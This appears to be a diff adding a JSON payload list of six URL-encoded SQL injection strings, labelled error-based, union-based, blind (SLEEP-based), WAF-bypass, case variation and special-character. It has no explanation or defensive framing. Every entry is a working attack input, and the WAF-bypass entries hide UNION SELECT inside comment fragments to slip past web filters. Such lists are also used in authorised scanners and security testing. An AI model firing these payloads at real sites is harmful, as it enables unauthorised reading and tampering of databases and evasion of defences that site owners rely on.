@@ -1,0 +1,26 @@
+[
+    {
+        "type": "Error-Based",
+        "payload": "%27%20OR%201%3D1%20--"
+    },
+    {
+        "type": "Union-Based",
+        "payload": "%27%20UN%3C%21--%20--%3EION%20SE%3C%21--%20--%3ELECT%20NULL%2CNULL%20--"
+    },
+    {
+        "type": "Blind",
+        "payload": "%27%20AND%20SLEEP%285%29%20--"
+    },
+    {
+        "type": "WAF-Bypass",
+        "payload": "%27/%2A%21UN%3C%21--%20--%3EION%2A/SE%3C%21--%20--%3ELECT/%2A%2A/NULL%2CNULL--"
+    },
+    {
+        "type": "Case Variation",
+        "payload": "%27%20UnIoN%20SeLeCt%20NULL%2CNULL--"
+    },
+    {
+        "type": "Special Char",
+        "payload": "%27%20OR%201%3D1%23"
+    }
+]
